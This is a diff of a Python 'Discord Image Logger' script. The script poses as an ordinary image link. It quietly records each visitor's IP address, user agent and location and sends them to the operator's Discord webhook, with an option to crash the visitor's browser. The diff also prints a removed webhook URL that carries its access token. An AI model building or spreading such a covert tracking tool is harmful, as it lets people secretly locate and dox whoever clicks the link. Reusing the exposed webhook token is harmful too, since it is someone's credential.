@@ -1,5 +1,7 @@
-# Discord Image Logger Base Code
+# Discord Image Logger for ya needs. *discontinued*
 # By Phobos
+# last updated: like a year ago something lol
+
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,8 +14,8 @@ __author__ = "Phobos"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1239162725775704165/u1-ipEGh5C2LSjAZPzVobValJ1zJ0OXosn9u7WshieLmow8Nd36IJvxd2mfP_gD8GeBn",
-    "image": "https://www.shutterstock.com/image-vector/click-here-button-hand-pointer-260nw-1187607886.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "", # enter webhook url here
+    "image": "", # the image you want it to appear when image is opened
     "imageArgument": True, # Allows you to use a URL argument to change the image
 
     # CUSTOMIZATION #
@@ -60,6 +62,7 @@ config = {
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
     # 4) Image 
+    # hierarchy determines what the script will prioritize over one another
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
@@ -180,8 +183,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by Phobos! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # This IS NOT a rat or virus, it's just a loading image.
    
 }
 
